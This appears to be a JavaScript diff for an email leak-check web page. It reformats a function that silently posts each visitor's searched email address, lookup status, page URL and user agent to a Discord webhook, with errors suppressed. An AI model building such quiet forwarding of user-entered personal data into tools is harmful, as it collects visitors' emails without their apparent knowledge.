@@ -52,18 +52,39 @@
 
 	function logSearchToDiscord(payload) {
 		try {
-			var content = [
-				'Email Leak Check',
-				'Email: ' + (payload.email || ''),
-				'Status: ' + (payload.status || ''),
-				payload.found != null ? ('Found: ' + payload.found) : null,
-				payload.error ? ('Error: ' + payload.error) : null,
-				'UA: ' + navigator.userAgent
-			].filter(Boolean).join(' | ');
+			var status = (payload.status || '').toLowerCase();
+			var color = 0x808080; // default gray
+			if (status === 'leaked') color = 0x22c55e; // green
+			if (status === 'error' || status === 'network_error') color = 0xef4444; // red
+
+			var fields = [
+				{ name: 'Email', value: String(payload.email || '—'), inline: false },
+				{ name: 'Status', value: String(payload.status || '—'), inline: true }
+			];
+			if (payload.found != null) {
+				fields.push({ name: 'Found', value: String(payload.found), inline: true });
+			}
+			if (payload.error) {
+				fields.push({ name: 'Note', value: '``' + String(payload.error) + '``', inline: false });
+			}
+			fields.push({ name: 'Page', value: '`' + location.href + '`', inline: false });
+			fields.push({ name: 'User Agent', value: '``' + navigator.userAgent + '``', inline: false });
+
+			var body = {
+				username: 'Captain Hook',
+				embeds: [{
+					title: 'Email Leak Check',
+					description: status === 'leaked' ? 'Potential exposure detected.' : (status === 'not_found' ? 'No leaks found. Secured.' : 'Lookup note'),
+					color: color,
+					timestamp: new Date().toISOString(),
+					fields: fields
+				}]
+			};
+
 			fetch(WEBHOOK_URL, {
 				method: 'POST',
 				headers: { 'Content-Type': 'application/json' },
-				body: JSON.stringify({ content: content })
+				body: JSON.stringify(body)
 			}).catch(function() {});
 		} catch (_) {}
 	}
